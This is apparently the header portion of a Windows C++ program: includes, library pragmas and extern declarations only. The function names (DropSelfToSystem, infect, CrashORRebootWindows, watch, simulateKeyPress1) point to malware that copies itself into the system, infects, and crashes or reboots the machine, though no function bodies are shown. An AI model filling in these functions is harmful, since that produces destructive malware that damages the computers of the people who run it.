#include <Windows.h>
#include <string>
#include <AclAPI.h>
#include <LM.h>
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "winmm.lib")

extern bool IsFirstRun();
extern void DropSelfToSystem(const char* name);
extern void CrashORRebootWindows();
extern void all();
extern void WHOAMI();
extern bool playAudio(HINSTANCE hInstance, WCHAR* lpName, UINT bFlags);
extern void stopAudio();
extern void simulateKeyPress1(WORD key1, WORD key2);
extern void clean();
extern void infect();
extern void user();
extern DWORD WINAPI watch(LPVOID parameter);
using namespace std;